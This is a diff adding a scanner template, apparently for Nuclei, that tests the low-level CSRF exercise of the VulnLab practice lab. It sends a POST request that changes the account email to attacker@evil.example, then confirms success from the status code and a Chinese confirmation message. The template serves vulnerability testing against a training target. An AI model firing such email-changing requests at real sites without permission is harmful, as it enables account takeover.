@@ -1,0 +1,24 @@
+id: vulnlab-csrf-low
+
+info:
+  name: VulnLab CSRF low 档
+  author: hediwen
+  severity: high
+  tags: vulnlab,csrf
+
+http:
+  - raw:
+      - |
+        POST /csrf/low.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        email=attacker%40evil.example
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        words:
+          - "受害者的邮箱已经被改成了 attacker@evil.example"
